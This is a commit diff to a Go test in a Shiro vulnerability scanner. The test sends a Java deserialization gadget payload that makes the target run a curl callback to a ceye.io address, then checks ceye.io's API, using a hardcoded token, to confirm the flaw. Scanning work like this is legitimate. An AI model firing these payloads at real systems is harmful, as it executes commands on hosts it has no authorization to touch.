27cc905c1cf8fee1ec78cf93fa1217e43cca90d9
EmYiQing <2023503307@qq.com>
2021-08-28 01:07:05 +0800

    check

--- core/shiro/test/shiro_test.go
+++ core/shiro/test/shiro_test.go
@@ -4,9 +4,13 @@ import (
 	"encoding/hex"
 	"fmt"
 	gososerial "github.com/EmYiQing/Gososerial"
+	"github.com/EmYiQing/XiuScan/core/http"
 	"github.com/EmYiQing/XiuScan/core/shiro"
+	"github.com/EmYiQing/XiuScan/core/tool"
 	"github.com/EmYiQing/XiuScan/log"
+	"strings"
 	"testing"
+	"time"
 )
 
 func TestFindShiro(t *testing.T) {
@@ -15,8 +19,14 @@ func TestFindShiro(t *testing.T) {
 	if key != "" {
 		log.Info("find key: %s", key)
 	}
-	payload := gososerial.GetCC5("curl 772m76.ceye.io")
+	randStr := tool.GetRandomLetter(20)
+	payload := gososerial.GetCC5("curl 772m76.ceye.io/" + randStr)
 	shiro.SendPayload(key, payload, target)
+	time.Sleep(time.Second * 3)
+	resp := http.Get("http://api.ceye.io/v1/records?token=59408d12c25f5163ae82409e76ef4898&type=http&filter=" + randStr)
+	if strings.Contains(string(resp.Body), randStr) {
+		log.Info("find shiro deserialization")
+	}
 }
 
 func TestEcho(t *testing.T) {
